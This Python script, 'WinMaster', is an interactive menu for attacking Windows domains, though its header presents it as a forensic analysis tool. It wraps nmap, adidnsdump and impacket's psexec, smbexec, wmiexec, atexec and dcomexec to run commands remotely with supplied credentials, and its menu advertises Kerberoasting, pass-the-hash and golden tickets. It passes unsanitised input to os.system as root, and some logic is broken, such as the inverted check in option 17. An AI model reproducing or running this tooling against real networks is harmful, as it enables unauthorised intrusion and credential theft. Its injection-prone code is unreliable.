#!/usr/bin/python3
# coding:UTF-8

# -------------------------------------------------------------------------------------
#       PYTHON SCRIPT FILE FOR THE FORENSIC ANALYSIS OF REMOTE WINDOWS SYSTEMS
#         BY TERENCE BROADBENT MSc DIGITAL FORENSICS & CYBERCRIME ANALYSIS
# -------------------------------------------------------------------------------------

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Sauna                                                                
# Details : Load required imports.
# Modified: N/A
# -------------------------------------------------------------------------------------

import os
import sys
import os.path
import hashlib
import binascii
import datetime
import linecache

from termcolor import colored					# pip install termcolor

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : Sauna                                                                
# Details : Conduct simple and routine tests on user supplied arguements.   
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

if os.geteuid() != 0:
    print("\n[*] Please run this python3 script as root...")
    exit(True)

if len(sys.argv) < 3:
    print("\nUse the command python3 WinMaster.py neo4j password\n")
    exit(True)

BH1 = sys.argv[1]	# NEO4J USERNAME
BH2 = sys.argv[2]	# NEO4J PASSWORD

BUG = 0			# BUGHUNT ON/OFF

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : Sauna
# Details : Create function calls from main.
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

def padding(variable,value):
   variable = variable.rstrip("\n")
   variable = variable[:value]
   while len(variable) < value:
      variable += " "
   return variable

def dpadding(variable,value):
   test = variable
   variable = variable.rstrip("\n")
   variable = variable[:value] 
   while len(variable) < value:
      if test == "":
         variable += " "
      else:
         variable += "."
   return variable

def gettime(value):
   variable = str(datetime.datetime.now().time())
   variable = variable.split(".")
   variable = variable[0]
   variable = variable.split(":")
   variable = variable[0] + ":" + variable[1]
   variable = padding(variable, value)
   return variable

def command(command):
   if BUG == 1:
         print(colored(command, 'white'))
   os.system(command)
   return

def prompt():
   selection = input("\nPress ENTER to continue...")
   return

def display():
   print('\u2554' + ('\u2550')*36 + '\u2566' + ('\u2550')*33 + '\u2566' + ('\u2550')*61 + '\u2557')
   print('\u2551' + (" ")*12 + colored("REMOTE SYSTEM",'white') +  (" ")*11 + '\u2551' + (" ")*10 + colored("SYSTEM SHARES",'white') + (" ")*10 + '\u2551' + (" ")*21 +  colored("USER INFORMATION",'white') + (" ")*24 + '\u2551') 
   print('\u2560' + ('\u2550')*14 + '\u2564' + ('\u2550')*21 + '\u256C' + ('\u2550')*12 + '\u2550' + ('\u2550')*20 + '\u256C' + ('\u2550')*61 + '\u2563')
  
   print('\u2551' + " DNS SERVER   " + '\u2502', end=' ')
   if DNS == "EMPTY              ":
      print(colored(DNS[:COL1],'yellow'), end=' ')
   else:
      print(colored(DNS[:COL1],'blue'), end=' ')
   print('\u2551', end=' ')
   print(colored(SHAR[0],'blue'), end=' ')
   print('\u2551', end=' ')
   print(colored(USER[0],'blue'), end=' ')
   print(colored(PASS[0],'blue'), end=' ')
   print('\u2551')
   print('\u2551' + " REMOTE IP    " + '\u2502', end=' ')
   if TIP == "EMPTY              ":
      print(colored(TIP[:COL1],'yellow'), end=' ')
   else:
      print(colored(TIP[:COL1],'blue'), end=' ')
   print('\u2551', end=' ')
   print(colored(SHAR[1],'blue'), end=' ')
   print('\u2551', end=' ')
   print(colored(USER[1],'blue'), end=' ')
   print(colored(PASS[1],'blue'), end=' ')
   print('\u2551')

   print('\u2551' + " USERNAME     " + '\u2502', end=' ')
   if USR[:2] == '""':
      print(colored(USR[:COL1],'yellow'), end=' ')
   else:
      print(colored(USR[:COL1],'blue'), end=' ')
   print('\u2551', end=' ')
   print(colored(SHAR[2],'blue'), end=' ')
   print('\u2551', end=' ')
   print(colored(USER[2],'blue'), end=' ')
   print(colored(PASS[2],'blue'), end=' ')
   print('\u2551')

   print('\u2551' + " PASSWORD     " + '\u2502', end=' ')
   if PAS[:2] == '""':
      print(colored(PAS[:COL1],'yellow'), end=' ')
   else:
      print(colored(PAS[:COL1],'blue'), end=' ')
   print('\u2551', end=' ')
   print(colored(SHAR[3],'blue'), end=' ')
   print('\u2551', end=' ')
   print(colored(USER[3],'blue'), end=' ')
   print(colored(PASS[3],'blue'), end=' ')
   print('\u2551')

   print('\u2551' + " NTLM HASH    " + '\u2502', end=' ')
   if NTM == "EMPTY              ":
      print(colored(NTM[:COL1],'yellow'), end=' ')
   else:
      print(colored(NTM[:COL1],'blue'), end=' ')
   print('\u2551', end=' ')
   print(colored(SHAR[4],'blue'), end=' ')
   print('\u2551', end=' ')
   print(colored(USER[4],'blue'), end=' ')
   print(colored(PASS[4],'blue'), end=' ')
   print('\u2551')

   print('\u2551' + " DOMAIN NAME  " + '\u2502', end=' ')
   if DOM == "EMPTY              ":
      print(colored(DOM[:COL1],'yellow'), end=' ')
   else:
      print(colored(DOM[:COL1],'blue'), end=' ')
   print('\u2551', end=' ')
   print(colored(SHAR[5],'blue'), end=' ')
   print('\u2551', end=' ')
   print(colored(USER[5],'blue'), end=' ')
   print(colored(PASS[5],'blue'), end=' ')
   print('\u2551')

   print('\u2551' + " DOMAIN SID   " + '\u2502', end=' ')
   if SID == "EMPTY              ":
      print(colored(SID[:COL1],'yellow'), end=' ')
   else:
      print(colored(SID[:COL1],'blue'), end=' ')
   print('\u2551', end=' ')
   print(colored(SHAR[6],'blue'), end=' ')
   print('\u2551', end=' ')
   print(colored(USER[6],'blue'), end=' ')
   print(colored(PASS[6],'blue'), end=' ')
   print('\u2551')     

   print('\u2551' + " SHARE NAME   " + '\u2502', end=' ')
   if TSH == "EMPTY              ":
      print(colored(TSH[:COL1],'yellow'), end=' ')
   else:
      print(colored(TSH[:COL1],'blue'), end=' ')
   print('\u2551', end=' ')
   print(colored(SHAR[7],'blue'), end=' ')
   print('\u2551', end=' ')
   print(colored(USER[7],'blue'), end=' ')
   print(colored(PASS[7],'blue'), end=' ')
   print('\u2551')   

   print('\u2551' + " IMPERSONATE  " + '\u2502', end=' ')
   if IMP == "Administrator      ":
      print(colored(IMP[:COL1],'yellow'), end=' ')
   else:
      print(colored(IMP[:COL1],'blue'), end=' ')
   print('\u2551', end=' ')
   print(colored(SHAR[8],'blue'), end=' ')
   print('\u2551', end=' ')
   print(colored(USER[8],'blue'), end=' ')
   print(colored(PASS[8],'blue'), end=' ')
   print('\u2551')      

   print('\u2551' + " WIN COMMAND  " + '\u2502', end=' ')
   if CMD == "whoami             ":
      print(colored(CMD[:COL1],'yellow'), end=' ')
   else:
      print(colored(CMD[:COL1],'blue'), end=' ')
   print('\u2551', end=' ')
   print(colored(SHAR[9],'blue'), end=' ')
   print('\u2551', end=' ')
   print(colored(USER[9],'blue'), end=' ')
   print(colored(PASS[9],'blue'), end=' ')
   print('\u2551')

   print('\u2551' + " CURRENT TIME " + '\u2502', end=' ')
   if SKEW == 0:
      print(colored(LTM[:COL1],'yellow'), end=' ')
   else:
      print(colored(LTM[:COL1],'blue'), end=' ')
   print('\u2551', end=' ')
   print(colored(SHAR[10],'blue'), end=' ')
   print('\u2551', end=' ')
   print(colored(USER[10],'blue'), end=' ')
   print(colored(PASS[10],'blue'), end=' ')
   print('\u2551')   

   print('\u2551' + " MY DIRECTORY " + '\u2502', end=' ')
   if DIR == "WORKAREA           ":
      print(colored(DIR[:COL1],'yellow'), end=' ')
   else:
      print(colored(DIR[:COL1],'blue'), end=' ')
   print('\u2551', end=' ')
   print(colored(SHAR[11],'blue'), end=' ')
   print('\u2551', end=' ')
   if USER[12][:1] != " ":
      print(colored(USER[11],'red'), end=' ')
   else:
      print(colored(USER[11],'blue'), end=' ')
   print(colored(PASS[11],'blue'), end=' ')
   print('\u2551')

   print('\u2560' + ('\u2550')*14 + '\u2567'+ ('\u2550')*21  + '\u2569' + ('\u2550')*12 + '\u2550' + ('\u2550')*20 + '\u2569' + ('\u2550')*61 + '\u2563')

def options():
   print('\u2551' + "(0) Save/Exit          (10) Re/Set WINCOMMAND (20) Get Arch (30) Enum4Linux     (40) Kerb Users Info (50) Golden PAC   (60) FTP     " + '\u2551')
   print('\u2551' + "(1) Re/Set DNS SERVER  (11) Re/Set CLOCK TIME (21) Net View (31) WinDap Search  (41) Kerb Filter     (51) Domain Dump  (61) SSH     " + '\u2551')
   print('\u2551' + "(2) Re/Set REMOTE IP   (12) Re/Set DIRECTORY  (22) Services (32) Lookup Sids    (42) Kerb Bruteforce (52) BH ACLPWN    (62) TelNet  " + '\u2551')
   print('\u2551' + "(3) Re/Set USERNAME    (13) Check Connection  (23) AtExec   (33) Sam Dump Users (43) Kerb Roasting   (53) Secrets Dump (63) NetCat  " + '\u2551')
   print('\u2551' + "(4) Re/Set PASSWORD    (14) Check DNS Records (24) DcomExec (34) Rpc Dump       (44) Kerb ASREPRoast (54) CrackMapExec (64) WinRM   " + '\u2551')
   print('\u2551' + "(5) Re/Set NTLM HASH   (15) Check DNS SERVER  (25) PsExec   (35) REGistery      (45) PASSWORD2HASH   (55) PsEcec HASH  (65) Desktop " + '\u2551')
   print('\u2551' + "(6) Re/Set DOMAIN NAME (16) Nmap O/S + Skew   (26) SmbExec  (36) Smb Client     (46) Pass the Hash   (56) SmbExec HASH (66)         " + '\u2551')
   print('\u2551' + "(7) Re/Set DOMAIN SID  (17) Nmap Subdomains   (27) WmiExec  (37) SmbMap SHARE   (47) Pass the Ticket (57) WmiExec HASH (67)         " + '\u2551')
   print('\u2551' + "(8) Re/Set SHARE NAME  (18) Nmap Intense TCP  (28) IfMap    (38) SmbMount SHARE (48) Silver Ticket   (58) Gen UserList (68)         " + '\u2551')
   print('\u2551' + "(9) Re/Set IMPERSONATE (19) Nmap Slow & Full  (29) OpDump   (39) Rpc Client     (49) Golden Ticket   (59) User Editor  (69) Autofill" + '\u2551')
   print('\u255A' + ('\u2550')*132 + '\u255D')

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Sauna                                                                
# Details : Display universal header.
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

command("clear")
print("__        _____ _   _   __  __    _    ____ _____ _____ ____      ") 
print("\ \      / /_ _| \ | | |  \/  |  / \  / ___|_   _| ____|  _ \     ") 
print(" \ \ /\ / / | ||  \| | | |\/| | / _ \ \___ \ | | |  _| | |_) |    ") 
print("  \ V  V /  | || |\  | | |  | |/ ___ \ ___) || | | |___|  _ <     ") 
print("   \_/\_/  |___|_| \_| |_|  |_/_/   \_\____/ |_| |_____|_| \_\    ")
print("                                                                  ")
print("BY TERENCE BROADBENT MSc DIGITAL FORENSICS & CYBERCRIME ANALYSIS\n")

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : Sauna
# Details : Boot the system and initialise program files and variables.
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

print("[*] Booting - [*] Please wait...\n")
if not os.path.exists("WORKAREA"):			
   os.mkdir("WORKAREA")
   print("[+] Work area created...")
else:
   print("[+] Work area already exists...")		# DEFAULT WORK DIRECTORY

if not os.path.exists("users.txt"):			
   command("touch users.txt")
   print("[+] File users.txt created...")
else:
   print("[+] File users.txt already exists...")	# USER LIST

print("[+] Populating system variables...")

PATH = "/usr/share/doc/python3-impacket/examples/" 	# IMPACKET LOCATION

SKEW = 0         	# TIME SKEW
COL1 = 19	 	# SESSIONS
COL2 = 31	 	# SHARE NAMES
COL3 = 26	 	# USER NAMES
COL4 = 32	 	# PASSWORDS
MAXX = 40		# 0 - 39

SHAR = [" "*COL2]*MAXX	# SHARE NAMES
USER = [" "*COL3]*MAXX	# USER NAMES
PASS = [" "*COL4]*MAXX  # PASSWORDS

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : Sauna
# Details : Check the config file for stored variables.
# Modified: N/A                                                               	
# -------------------------------------------------------------------------------------

if not os.path.exists('config.txt'):
   print("[+] Configuration file not found - using defualt values...")
   DNS = "EMPTY              " # DNS NAME
   TIP = "EMPTY              " # REMOTE IP
   USR = '""                 ' # SESSION USERNAME
   PAS = '""                 ' # SESSION PASSWORD       
   NTM = "EMPTY              " # NTLM HASH
   DOM = "EMPTY              " # DOMAIN NAME
   SID = "EMPTY              " # DOMAIN SID
   TSH = "EMPTY              " # SESSION SHARE
   IMP = "Administrator      " # IMPERSONATE
   CMD = "whoami             " # WINDOWS COMMAND                                            
   LTM = "00:00              " # LOCAL TIME    
   DIR = "WORKAREA           " # DIRECTORY
else:
   print("[+] Configuration file found - restoring saved data....")
   DNS = linecache.getline('config.txt', 1).rstrip("\n")
   TIP = linecache.getline('config.txt', 2).rstrip("\n")
   USR = linecache.getline('config.txt', 3).rstrip("\n")
   PAS = linecache.getline('config.txt', 4).rstrip("\n")
   NTM = linecache.getline('config.txt', 5).rstrip("\n")
   DOM = linecache.getline('config.txt', 6).rstrip("\n")
   SID = linecache.getline('config.txt', 7).rstrip("\n")
   TSH = linecache.getline('config.txt', 8).rstrip("\n")
   IMP = linecache.getline('config.txt', 9).rstrip("\n")
   CMD = linecache.getline('config.txt', 10).rstrip("\n")
   LTM = linecache.getline('config.txt', 11).rstrip("\n")
   DIR = linecache.getline('config.txt', 12).rstrip("\n")

   if len(DNS) < COL1: DNS = padding(DNS, COL1)
   if len(TIP) < COL1: TIP = padding(TIP, COL1)
   if len(USR) < COL1: USR = padding(USR, COL1)
   if len(PAS) < COL1: PAS = padding(PAS, COL1)
   if len(NTM) < COL1: NTM = padding(NTM, COL1)
   if len(DOM) < COL1: DOM = padding(DOM, COL1)
   if len(SID) < COL1: SID = padding(SID, COL1)
   if len(TSH) < COL1: TSH = padding(TSH, COL1)
   if len(IMP) < COL1: IMP = padding(IMP, COL1)
   if len(CMD) < COL1: CMD = padding(CMD, COL1)
   if len(LTM) < COL1: LTM = padding(LTM, COL1)
   if len(DIR) < COL1: DIR = padding(DIR, COL1)

print("[+] Starting neo4j database...")
command("touch log.txt")
command("neo4j start   >> log.txt 2>&1")
# command("neo4j console >> log.txt 2>&1")
os.remove("log.txt")

input("\n[*] Please ENTER key to continue...")

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : Sauna
# Details : Start the main menu controller.
# Modified: N/A                                                               	
# -------------------------------------------------------------------------------------

while True: 
   command("clear")
   linecache.clearcache()
   LTM = gettime(COL1)
   display()
   options()
   selection=input("[*] Please Select: ")

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Sauna
# Details : Menu option selected - Save current data to config.txt and exit the program.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '0':
      command("echo " + DNS + " > config.txt")			# CREATE NEW CONFIG FILE
      command("echo " + TIP  + " >> config.txt")

      if USR.rstrip(" ") == "\"\"":
         command("echo '\"\"' >> config.txt")
      else:
         command("echo " + USR  + " >> config.txt")           
      
      if PAS.rstrip(" ") == "\"\"":
         command("echo '\"\"' >> config.txt")
      else:
         command("echo " + PAS  + " >> config.txt")     
 
      command("echo " + NTM.rstrip("\n") + " >> config.txt")
      command("echo " + DOM  + " >> config.txt")  
      command("echo " + SID.rstrip("\n") + " >> config.txt")
      command("echo " + TSH  + " >> config.txt")  
      command("echo " + IMP  + " >> config.txt")  
      temp = '\"' + CMD.rstrip(" ") + '\"'
      command("echo " + temp + " >> config.txt")  
      command("echo " + LTM  + " >> config.txt")  
      command("echo " + DIR  + " >> config.txt")       

      exit(1)

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Sauna
# Details : Menu option selected - Change remote DNS SERVER name.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='1':
      BAK = DNS
      DNS = input("\n[*] Please enter DNS SERVER name: ")

      if DNS != "":
         if len(DNS) < COL1:
            DNS = padding(DNS, COL1)
         command("echo '" + TIP.rstrip(" ") + "\t" + DNS.rstrip(" ") + "' >> /etc/hosts")
         print("\n[+] DNS SERVER " + DNS.rstrip(" ") + " has been added to /etc/hosts...")
         prompt()
      else:
         DNS = BAK      

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Sauna
# Details : Menu option selected - Change remote IP address.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='2':
      BAK = TIP
      TIP = input("\n[*] Please enter REMOTE IP address: ")

      if TIP == "":
         TIP = BAK
      else:
         if len(TIP) < COL1:
            TIP = padding(TIP, COL1)

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Sauna
# Details : Menu option selected - Change the current USER.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '3':
      BAK = USR
      USR = input("\n[*] Please enter USERNAME: ")

      if USR != "":
         if len(USR) < COL1:
            USR = padding(USR, COL1)
         for a in range(0, MAXX):
            if USER[a].rstrip(" ") == USR.rstrip(" "):
               NTM = PASS[a]	# UPDATE HASH VALUE TO MATCH USER.
      else:
         USR = BAK

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Sauna
# Details : Menu option selected - Change the current USERS PASSWORD.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '4':
      BAK = PAS
      PAS = input("\n[*] Please enter PASSWORD: ")

      if PAS != "":
         if len(PAS) < COL1:
            PAS = padding(PAS, COL1)
      else:
         PAS = BAK

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Sauna
# Details : Menu option selected - Change the current USERS HASH value.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '5':
      BAK = NTM
      NTM = input("\n[*] Please enter HASH value: ")

      if NTM != "":
         if len(NTM) < COL1:
            NTM = padding(NTM, COL1)
      else:
         NTM = BAK

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Sauna
# Details : Menu option selected - Change the remote DOMAIN name.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '6':
      BAK = DOM
      DOM = input("\n[*] Please enter DOMAIN name: ")

      if DOM != "":
         if len(DOM) < COL1:
            DOM = padding(DOM, COL1)
         command("echo '" + TIP.rstrip(" ") + "\t" + DOM.rstrip(" ") + "' >> /etc/hosts")
         print("\n[+] DOMAIN " + DOM.rstrip(" ") + " has been added to /etc/hosts...")
         prompt()
      else:
         DOM = BAK      

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Sauna
# Details : Menu option selected - Change the remote DOMAIN SID value.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '7':
      BAK = SID
      SID = input("\n[*] Please enter DOMAIN SID value: ")

      if SID != "":
         if len(SID) < COL1:
            SID = padding(SID, COL1)
      else:
         SID = BAK

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Sauna
# Details : Menu option selected - Change the remote SHARE name.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '8':
      BAK = TSH
      TSH = input("\n[*] Please enter SHARE name: ")

      if TSH != "":
         if len(TSH) < COL1:
            TSH = padding(TSH,COL1)
      else:
         TSH = BAK

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                           
# CONTRACT: GitHub
# Version : Sauna
# Details : Menu option selected - Change the remote Windows USER to impersonate.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '9':
      BAK = IMP
      IMP = input("\n[*] Please enter IMPERSONATOR name: ")

      if IMP != "":
         if len(IMP) < COL1:
            IMP = padding(IMP, COL1)
      else:
         IMP = BAK

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                           
# CONTRACT: GitHub
# Version : Sauna
# Details : Menu option selected - Change the remote windows COMMAND.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '10':
      BAK = CMD
      CMD = input("\n[*] Please enter Windows COMMAND: ")

      if CMD != "":
         if len(CMD) < COL1:
            CMD = padding(CMD, COL1)
      else:
         CMD = BAK

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                           
# CONTRACT: GitHub
# Version : Sauna
# Details : Menu option selected - Reset local TIME to match kerberos skew. 
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '11':
      BAK = LTM
      LTM = input("\n[*] Please enter computer TIME: ")

      if LTM != "":
         command("date --set=" + LTM)
         LTM = padding(LTM, COL1)
         SKEW = 1
      else:
         LTM = BAK      
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Sauna
# Details : Menu option selected - Change local working DIRECTORY.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '12':
      directory = input("\n[*] Please enter new working DIRECTORY: ")

      if os.path.exists(directory):
         print("\n[-] Directory already exists....")
      else:
         if len(directory) > 0:
            os.mkdir(directory)
            DIR = directory
            if len(DIR) < COL1:
               DIR = padding(DIR, COL1)
            print("\n[+] Working directory changed...")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Sauna
# Details : Menu option selected - Ping localhost IP.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '13':
      if TIP[:5] != "EMPTY":
         command("ping -c 5 "  + TIP.rstrip(" "))
      else:
         print("[-] Remote IP address has not been specified...")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Sauna
# Details : Menu option selected - adidnsdump -u DOMAIN\USER -p PASSWORD DOMAIN --include-tombstoned -r
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '14':
      CheckParams = 0
      if (DOM[:5] == "EMPTY"):
         print("\n[-] Domain name not specified...")
         CheckParams = 1

      if (USR[:2] == '""'):
         print("\n[-] User name not specified...")
         CheckParams = 1

      if (PAS[:2] == '""'): 
         print("\n[-] Password not specified...")
         CheckParams = 1

      if CheckParams != 1:
         command("adidnsdump -u '" + DOM.rstrip(" ") + "\\" + USR.rstrip(" ") + "' -p '" + PAS.rstrip(" ") +"' " + DOM.rstrip(" ") + " --include-tombstoned -r")
         command("sed -i '1d' records.csv")
         command("\ncat records.csv")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Sauna
# Details : Menu option selected - fierce -dns DNS SERVER.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '15':
      if DNS[:5] != "EMPTY":
         command("fierce -dns " + DNS.rstrip(" "))
      else:
         print("\n[-] DNS server has not been specified...")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Sauna
# Details : Menu option selected - nmap -sU -O -p 123 --script ntp-info IP.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '16':
      if TIP[:5] != "EMPTY":
         command("nmap -sU -O -p 123 --script ntp-info " + TIP.rstrip(" "))
      else:
         print("\n[-] Remote IP address has not been specified...")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Sauna
# Details : Menu option selected - nmap -p 80 --script http-vhosts --script-args http-vhosts.domain=DOMAIN IP.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '17':
      CheckParams = 0

      if DOM[:5] != "EMPTY":
         print("\n[-] Domain name has not been specified...")
         CheckParams = 1

      if TIP[:5] != "EMPTY":
         print("\n[-] Remote IP address has not been specified...")
         CheckParams = 1

      if CheckParams != 1:
         command("nmap -p 80 --script http-vhosts --script-args http-vhosts.domain=" + DOM.rstrip(" ") + " " + TIP.rstrip(" "))
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Sauna
# Details : Menu option selected - Intense quick TCP scan.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '18':
      if TIP[:5] != "EMPTY":
         command("nmap -T4 -F " + TIP.rstrip(" "))
      else:
         print("\n[-] Remote IP address has not been specified...")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Sauna
# Details : Menu option selected - Full, slow and comprehensive nmap scan.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '19':
      if TIP[:5] != "EMPTY":
         command("nmap -sS -sU -T4 -A -v -PE -PP -PS80,443 -PA3389 -PU40125 -PY -g 53 --script 'default or (discovery and safe)' " + TIP.rstrip(" "))
      else:
         print("\n[-] Remote IP address has not been specified...")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Sauna
# Details : Menu option selected - getArch.py -target IP
# Details : 32/64 bit
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '20':
      command(PATH + "getArch.py -target " + TIP.rstrip(" "))
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Sauna
# Details : Menu option selected - netview.py DOMAIM/USER:PASSWORD -target IP
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='21':
      command(PATH + "netview.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"' -target " + TIP.rstrip(" "))
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Sauna
# Details : Menu option selected - services.py USER:PASSWOrd@IP list.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='22':
      command(PATH + "services.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" ") + " list")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Sauna
# Details : Menu option selected - atexec.py DOMAIN/USER:PASSWORD@IP WIN COMMAND.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '23':
      command(PATH + "atexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" ") + " '" + CMD.rstrip(" ") + "'")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Sauna
# Details : Menu option selected - dcomexec.py DOMAIN/USER:PASSWORD@IP WIN COMMAND.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '24':
      command(PATH + "dcomexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" '") + CMD.rstrip(" ") + "'")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Sauna
# Details : Menu option selected - psexec.py DOMAIN/USER:PASSWORD@IP cmd.exe.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '25':
      if USR.rstrip(" ") != "Administrator":
         command(PATH + "psexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" ") + " > SHARES.tmp")
         command("cat SHARES.tmp")

#        CODE TO BE ENTERED HERE TO CATCH SHARES
#         command("sed -i '1,3d' SHARES.tmp")
#         command("sed -i -e 's/share //g' SHARES.tmp")
#         os.remove("SHARES.tmp")
      else:
         command(PATH + "psexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" "))
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Sauna
# Details : Menu option selected - smbexec.py DOMAIN/USER:PASSWORD@IP.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '26':
      command(PATH + "smbexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" "))
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Sauna
# Details : Menu option selected - wmiexec.py DOMAIN/USER:PASSWORD@IP WIN COMMAND.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '27':
      command(PATH + "wmiexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" "))
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Sauna
# Details : Menu option selected - ifmap.py IP 135.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '28':
      command(PATH + "ifmap.py " + TIP.rstrip(" ") + " 135")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Sauna
# Details : Menu option selected - opdump.py IP 135 99FCFEC4-5260-101B-BBCB-00AA0021347A 0.0.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '29':
      ifmap = input("\n[*] Please enter MSRPC interface (ifmap) : ")     
      if ifmap != "":
         command(PATH + "opdump.py " + TIP.rstrip(" ") + " 135 " + ifmap)
      prompt()

